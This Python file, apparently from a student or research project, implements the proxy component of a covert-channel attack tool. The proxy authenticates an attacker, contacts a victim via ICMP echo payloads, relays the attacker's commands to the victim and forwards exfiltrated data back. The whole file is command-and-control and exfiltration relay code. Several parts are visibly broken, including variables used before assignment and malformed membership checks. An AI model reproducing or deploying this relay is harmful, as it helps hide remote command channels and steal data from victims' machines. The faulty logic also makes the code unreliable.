import ipaddress
import json
import os
import socket
import threading
from Programma.attack.attack_classes import _IPx
from Programma.custom_enum import ATTACK_TYPE
from Programma.methods.network_methods import get_local_IP
from Programma.methods.check_type import is_enum_member, is_integer, is_ipaddress, is_boolean, is_string, is_list, is_bytes, is_socket
from Programma.custom_enum import MSG, SENDER_TYPE, EXIT_CASES
from Programma.config import default_file_path, localhost, attacker_mode, type_sender, use_delay
from Programma.attack.singleton import SendSingleton, ReceiveSingleton
from Programma.thread_methods import THREAD_PROXY

class Proxy:  
    def __init__(self, ip_attaccante:ipaddress.IPv4Address=None, proxy_port:int=None ): 
        def get_ip_host(): 
            ip_host, errore=get_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                try: 
                    ip_host=ipaddress.ip_address(input(msg)) 
                except Exception as e: 
                    print(e) 
                    return None
            try: 
                #TODO eliminare alla fine
                #self.ip_host=ipaddress.ip_address("192.168.56.104") 
                ip_host=ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None
            print(f"ip_host: {type(ip_host)} {ip_host}") 
            return ip_host
        def attacker_mode(): 
            config_file=None 
            if not os.path.exists(default_file_path) or not str(default_file_path).endswith(".json"):
                raise FileNotFoundError(f"Il file {default_file_path} non esiste") 
            with open(default_file_path, 'r') as file: 
                print(f"File di configurazione {default_file_path} caricato correttamente") 
                config_file= json.load(file) 
            self.attack_function=ATTACK_TYPE.get_attack_method(config_file.get("attack_function"))
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                self.attack_function=ATTACK_TYPE.choose_attack_function() 
            print(f"ATTACCO:",self.attack_function) 
            self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))   
            if not is_ipaddress(self.ip_vittima):
                raise TypeError("ip_vittima non valido") 
            print(f"IP VITTIMA",self.ip_vittima) 
        #-------------------------- 
        self.ip_host:ipaddress.IPv4Address=None 
        while not is_ipaddress(self.ip_host): 
            self.ip_host=get_ip_host() 
        print(f"IP HOST",self.ip_host) 
        self.socket_attacker:socket=None #tuple[socket, _RetAddress]  
        if not is_ipaddress(ip_attaccante): 
            raise TypeError("Indirizzo IP attaccante non valido")  
        self.ip_attaccante:ipaddress.IPv4Address=ip_attaccante
        if self.ip_attaccante.compressed==localhost: 
            self.ip_attaccante=self.ip_host 
        print(f"IP ATTACCANTE: {self.ip_attaccante}") 
        if not is_integer(proxy_port): 
            raise TypeError("Porta non valida") 
        self.proxy_port=proxy_port  
        self.ip_vittima:ipaddress.IPv4Address=None  
        self.exfiltred_data:list=[] 
        self.attack_function:ATTACK_TYPE=None 
        if attacker_mode: 
            return attacker_mode() 
    
    def start(self): 
        def connessione_attaccante():  
            #--------------------------------
            #with self.socket_attacker: 
            #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6 
            while True: 
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                    print(f"Server listening: {s}")  
                    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
                    s.bind(
                        (self.ip_host.compressed, self.proxy_port)
                        #("192.168.56.104", 4567) 
                        #(socket.gethostname(), 4567)
                    ) 
                    s.listen(1) 
                    accepted_socket,accepted_addr=s.accept() 
                    #accepted_addr=ipaddress.ip_address(accepted_addr)
                    if accepted_addr==self.ip_attaccante.compressed: 
                        print("Stabilita connessione con attaccante: ", accepted_addr) 
                        self.socket_attacker=accepted_socket 
                        break
                    accepted_socket.close() 
            print("SOCKET",accepted_socket) 
            data_received=""
            while True:
                self.socket_attacker.settimeout(10) 
                chunk=self.socket_attacker.recv(1024).decode() 
                if not chunk: break
                data_received+=chunk
                if MSG.END_SOCKETSEND.value in data_received: 
                    data_received=data_received.replace(MSG.END_SOCKETSEND.value,"")
                    break  
            if MSG.CONFIRM_ATTACKER.value not in data_received: 
                peer = self.socket_attacker.getpeername() #self.socket_attacker[0]
                self.socket_attacker.close()  
                raise ValueError(f"Invalid data from {peer}:\t{data_received}")  
            print("Dati ricevuti: ", data_received) 
            if MSG.CONFIRM_ATTACKER.value not in data: 
                raise ValueError("Il messagigo non contiene l'indirizzo IP della vittima:",data_received) 
            if not MSG.ATTACK_FUNCTION.value in data: 
                raise ValueError("Il messagigo non contiene la tipologia di attacco utilizzato:",data_received) 
            for data in data_received.split("||"):
                if MSG.CONFIRM_ATTACKER.value in data: 
                    self.ip_vittima=ipaddress.ip_address(
                        data.replace(MSG.CONFIRM_ATTACKER.value,"") 
                    )
                    print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
                elif MSG.ATTACK_FUNCTION.value in data:  
                    self.attack_function=ATTACK_TYPE.get_attack_method(
                        data.replace(MSG.ATTACK_FUNCTION.value,"").strip()
                    )
                    print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
                else: print("UNKNOWN DATA",data) 
            data=(MSG.CONFIRM_PROXY.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed
                )
            self.socket_attacker.sendall(data.encode()) 
        def connessione_vittima(): 
            thread_victim_connection=THREAD_PROXY.VICTIM_CONNECTION()
            thread_victim_connection.start(self.ip_vittima, self.ip_host) 
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                raise TypeError("attack_function non valida")  
            #int_version=self.attack_function.name.replace("ipv","").split("_")[0]  
            #int_code=self.attack_function.value  
            #XORversion= ord("i") ^ int(int_version) 
            #XORcode= ord("p") ^ int(int_code)  
            #icmp_id=(XORversion<<8)+XORcode  
            confirm_text=(
                MSG.CONFIRM_PROXY.value+
                self.ip_vittima.compressed+
                self.attack_function.name 
            ) 
            SendSingleton(
                ATTACK_TYPE.ipv4_echo_payload, 
                SENDER_TYPE.TRUE_SENDER, 
                False 
            ).send_data(confirm_text.encode(), self.ip_vittima) 
            print("Confirm sent to victim...") 
            print("Waiting thread to end...") 
            with thread_victim_connection.lock: 
                response=thread_victim_connection.response
            print("Thread has been executed...") 
            if is_boolean(response): 
                print("Aggiorno attaccante...")
                update_attaccante(response)  
            if response: 
                print("Received confirm from victim...") 
            else: raise RuntimeError("Conferma non arrivata dalla vittima") 
        def update_attaccante(result:bool): 
            #AGGIORNO ATTACCANTE SU CONNESISONE CON VITTIMA
            if attacker_mode: 
                print("ATACKER_MODE->update_attaccante")
                return
            if not is_boolean(result): 
                raise TypeError("result non booleano") 
            if not is_ipaddress(self.ip_vittima): 
                raise TypeError("ip_vittima non valido") 
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido") 
            if not isinstance(self.socket_attacker,socket): 
                if attacker_mode: 
                    print("ATTACKER MODE -> socket_attacker")
                else: raise TypeError("socket_attacker non valido") 
            data=(
                MSG.CONFIRM_VICTIM.value+
                self.ip_vittima.compressed+
                self.ip_host.compressed+
                str(result) 
            )  
            if attacker_mode: 
                print("ATTACKER MODE -> SendSingleton")
                SendSingleton(
                    ATTACK_TYPE.ipv4_echo_payload, 
                    SENDER_TYPE.TRUE_SENDER, 
                    False 
                ).send_data(data.encode(), self.ip_host) 
            else: self.socket_attacker.sendall(data.encode())  
            print(f"Aggiornamento confermato all'attaccante")
            if not result:
                self.socket_attacker.close()
                raise SystemError("NON CONNESSO ALLA VITITMA",self.ip_vittima) 
            print("CONNESSO A",self.ip_vittima)  
        def end_communication_wth_victim():
            if not is_ipaddress(self.ip_vittima):
                raise Exception(f"ip_vittima non validi ipaddress") 
            data=MSG.END_COMMUNICATION.value
            #SNIFFER.send_packet(data.encode(),ip_dst=ip_vittima) 
            SendSingleton(
                self.attack_function, 
                type_sender, 
                use_delay 
            ).send_data(data.encode(), self.ip_vittima) 
            print("VITTIMA AGGIORNATA") 
        def comando_from_attaccante():   
            received_command=""
            while True: 
                if attacker_mode: 
                    msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
                    command=input(msg)  
                    received_command=MSG.CONFIRM_COMMAND.value+command  
                    break 
                self.socket_attacker.settimeout(10) 
                chunk=self.socket_attacker.recv(1024).decode() 
                if not chunk: continue
                received_command+=chunk
                if MSG.END_SOCKETSEND.value in received_command: 
                    received_command=received_command.replace(MSG.END_SOCKETSEND.value,"")
                    break  
            if not is_string(received_command) or ([MSG.CONFIRM_COMMAND.value,MSG.WAIT_DATA.value] not in received_command):
                raise ValueError("Comando non valido:",received_command) 
            if any(case in received_command for case in [e.value for e in EXIT_CASES]): 
                raise ValueError("received_command in exit_cases",received_command) 
            print("Received command:", received_command) 
            #data=wait_class.wait().data
            integer=0
            if MSG.CONFIRM_COMMAND.value in received_command: 
                integer+=1
            if MSG.WAIT_DATA.value in command:
                integer+=2 
            match integer:
                case 1: 
                    command= received_command.replace(MSG.CONFIRM_COMMAND.value,"").strip() 
                    print("COMANDO",command) 
                    SendSingleton(
                        self.attack_function, 
                        type_sender, 
                        use_delay 
                    ).send_data(command.encode(), self.ip_vittima) 
                case 2: 
                    print("Aspetto i dati dalla vittima") 
                case _: 
                    raise ValueError(f"Caso non contemplato:",integer,"\n",received_command) 
            print(f"Aspetto che {self.ip_vittima} mandi i dati con il Covert Channel {self.attack_function.name} ") 
        def inoltra_dati(): 
            if not is_list(self.exfiltred_data) or len(self.exfiltred_data)<=0: 
                print("Nessun dato ricevuto") 
                self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode()) if not attacker_mode else None
                raise Exception(f"Lista dati esfiltrati non valida:",type(self.exfiltred_data),self.exfiltred_data)  
            if attacker_mode: 
                return 
            for data in self.exfiltred_data:
                try: 
                    print("Inoltro:",data)  
                    if not is_bytes(data): 
                        data=bytes(data) 
                    self.socket_attacker.sendall(data) 
                except Exception as e: 
                    print("Conversione non riuscita",e)  
                except Exception as e:
                    print("Invio dati non riuscito",e) 
            self.socket_attacker.sendall(MSG.LAST_PACKET.value.encode())
        #--------------------------- 
        try:
            #firewall_disable() 
            print("Controllo connesisone con attaccante")
            connessione_attaccante() 
            if not is_socket(self.socket_attacker) and not attacker_mode: 
                raise TypeError("socket non valido",self.socket_attacker)
            print("Connessione con attaccante stabilita") 
            print("Controllo connessione con vittima")
            connessione_vittima() 
            print("Waiting command from attacker...") 
            wait_class=ReceiveSingleton(self.attack_function).wait_class 
            if not isinstance(wait_class, _IPx):  
                raise TypeError("wait_class non _IPx",type(wait_class)) 
            thread_data=threading.Thread(target= lambda: wait_class.wait() ) 
            while True: 
                thread_data.start()
                try: 
                    comando_from_attaccante()
                except Exception as e:
                    print(e)
                    break 
                if thread_data.ident is not None:
                    thread_data.join() 
                self.exfiltred_data=wait_class.data 
                print("DATA RECEIVED:",self.exfiltred_data)
                inoltra_dati() 
                #reset()
            print("Interruzione programma") 
            end_communication_wth_victim() 
            self.socket_attacker.close()  if not attacker_mode else None
        except Exception as e: 
            print(e) 
        finally: 
            pass 
            #firewall_enable() 
